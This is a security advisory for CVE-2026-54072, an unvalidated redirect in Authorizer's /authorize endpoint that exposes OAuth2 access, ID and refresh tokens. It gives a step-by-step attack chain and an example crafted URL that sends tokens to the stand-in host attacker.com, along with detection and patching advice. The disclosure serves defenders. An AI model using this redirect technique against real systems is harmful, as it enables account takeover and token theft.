---
title: Authorizer Unvalidated Redirect Vulnerability Allows OAuth2 Token Theft
slug: 2026-07-authorizer-unvalidated-redirect
description: An unvalidated redirect vulnerability, CVE-2026-54072, in the Authorizer `/authorize` endpoint allows an unauthenticated attacker to steal OAuth2 access, ID, and refresh tokens by crafting a malicious URL with an attacker-controlled `redirect_uri` to which the application redirects a logged-in user, exposing their tokens.
date: "2026-07-10T19:27:19Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - oauth
  - vulnerability
  - redirect
  - token-theft
  - web
  - ghsa
vendors:
  - Authorizer
products:
  - authorizer (< 0.0.0-20260409051328-bd3f5baf6d3d)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1566
    technique_name: Phishing
    evidence: An attacker who tricks a logged-in user into clicking a crafted link can steal the victim's access_token, id_token, and refresh_token.
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1528
    technique_name: Steal Application Access Tokens
    evidence: When victim opens this URL, tokens are delivered to attacker.com
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-h29v-hj44-q8cv
iocs:
  - type: domain
    value: attacker.com
ioc_counts:
  domain: 1
rules:
  - title: Detects CVE-2026-54072 Exploitation - Malicious redirect_uri in Authorizer /authorize Endpoint
    description: Detects exploitation attempts of CVE-2026-54072 where an attacker specifies a malicious external redirect_uri (e.g., 'attacker.com') in requests to the Authorizer /authorize endpoint to steal OAuth2 tokens.
    platform: sigma
    severity: high
    tactics:
      - credential_access
      - initial_access
    techniques:
      - T1528
      - T1566.002
    data_sources:
      - webserver
rules_count: 1
---

A critical unvalidated redirect vulnerability (CVE-2026-54072) in the Authorizer platform allows attackers to steal sensitive OAuth2 tokens. This flaw affects Authorizer versions prior to `0.0.0-20260409051328-bd3f5baf6d3d`. An unauthenticated attacker can exploit this by first querying the publicly accessible `/graphql` endpoint to retrieve a valid `client_id`. They then craft a malicious URL targeting the `/authorize` endpoint, embedding an arbitrary, attacker-controlled `redirect_uri`. If a logged-in victim clicks this link, the Authorizer application performs a 302 redirect to the attacker's specified URL, appending the victim's `access_token`, `id_token`, and `refresh_token` as query parameters. This enables the attacker to intercept these tokens and impersonate the victim for the tokens' entire lifetime, bypassing authentication mechanisms. A partial fix was applied in v2.0.1 for other handlers, but the `/authorize` endpoint was overlooked.

## Attack Chain

1. Attacker queries the public `/graphql` endpoint (e.g., `http://TARGET/graphql`) to obtain the `client_id` parameter, which is required for authorization requests.
2. The attacker crafts a malicious URL, including the obtained `client_id` and a controlled `redirect_uri` (e.g., `https://attacker.com/steal`), pointing to the vulnerable Authorizer `/authorize` endpoint.
3. The malicious URL (e.g., `http://TARGET/authorize?response_type=token&client_id=...&redirect_uri=https://attacker.com/steal`) is delivered to a logged-in victim, typically via social engineering.
4. When the victim clicks the malicious link, their browser sends an HTTP GET request to the Authorizer `/authorize` endpoint.
5. The Authorizer server, lacking proper validation for the `redirect_uri` parameter against `AllowedOrigins`, processes the request.
6. The server issues a 302 HTTP redirect response, appending the victim's `access_token`, `id_token`, and `refresh_token` as query parameters to the attacker-controlled `redirect_uri`.
7. The victim's browser automatically follows the redirect, sending the sensitive tokens to the attacker's server.
8. The attacker receives and logs the tokens, gaining unauthorized access to the victim's account and the ability to impersonate them.

## Impact

Successful exploitation of CVE-2026-54072 results in the complete compromise of a victim's OAuth2 tokens, including `access_token`, `id_token`, and `refresh_token`. An attacker can then use these stolen tokens to impersonate the victim and access resources or perform actions on their behalf for the full duration of the token's validity, without any further user interaction beyond the initial click. While the specific number of victims or targeted sectors is not disclosed, any organization using affected versions of Authorizer is at risk of account takeover and unauthorized data access.

## Recommendation

* Patch CVE-2026-54072 immediately by updating Authorizer to a patched version (newer than `0.0.0-20260409051328-bd3f5baf6d3d`).
* Deploy the Sigma rule "Detects CVE-2026-54072 Exploitation - Malicious redirect_uri in Authorizer /authorize Endpoint" to your SIEM to detect attempts at exploiting this vulnerability.
* Block `attacker.com` at your network perimeter, including DNS resolvers and web proxies.
